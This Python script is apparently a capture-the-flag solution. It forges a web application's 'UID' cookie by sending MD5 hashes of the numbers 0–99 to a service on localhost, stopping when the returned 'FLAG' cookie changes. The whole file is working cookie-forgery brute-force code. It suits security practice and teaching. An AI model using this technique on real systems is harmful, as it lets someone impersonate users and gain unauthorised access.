import hashlib
import codecs
import numpy as np
import requests

#IP
ip = "127.0.0.1"
port= "8080"

#we first check that our MD5 works by comparing Md5(100) with
#the one in the webpage
control = "f899139df5e1059396431415e770c6dd"
tester = 100
tester_b = str.encode(str(tester))
tester_md5 = hashlib.md5(tester_b).hexdigest()
print(f"tester={tester_md5 == control}")

#try a request to the web application
cookies = {"UID":tester_md5}
r = requests.post(f"http://{ip}:{port}", cookies = cookies)
def_flag = r.cookies["FLAG"] #default flag

print(f"default flag\t{def_flag}")

#brute force cycle
for i in range(100):
    """ compute the MD5 """
    #convert the number to a byte
    byte_i = str.encode(str(i))

    #obtain the MD5
    md5_i = hashlib.md5(byte_i).hexdigest()

    #     """ Send request to the web application """
    #set the cookie
    cookies = {'UID': str(md5_i)}
    r = requests.post(f"http://{ip}:{port}", cookies = cookies)

    #get the i-th flag
    flag_i = r.cookies["FLAG"]

    #if the content of the cookie is different to the 100th one, we have the flag
    if flag_i != def_flag:
        print(f"FLAG found at iteration={i}\t{flag_i}")
        break
